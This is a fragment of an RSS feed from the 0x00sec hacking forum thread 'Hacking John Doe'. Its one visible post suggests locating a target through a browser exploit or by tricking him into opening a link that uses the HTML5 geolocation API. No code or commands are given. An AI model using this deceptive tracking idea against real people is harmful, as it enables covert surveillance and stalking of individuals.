        <link>https://0x00sec.org/t/hacking-john-doe/716/6</link>
        <pubDate>Sat, 09 Jul 2016 11:41:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-6</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Hope this won’t happen in europe! <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:"> Referring to the story, in this case you could still get his location through an browser exploit or social engineering (e.g. sending him a link to a website which has a valid reason to retrieve his location <a href="http://www.w3schools.com/html/html5_geolocation.asp" rel="nofollow noopener">through the HTML5 geolocation API</a>)</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/5</link>
        <pubDate>Sat, 09 Jul 2016 11:16:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-5</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
  </channel>
</rss>
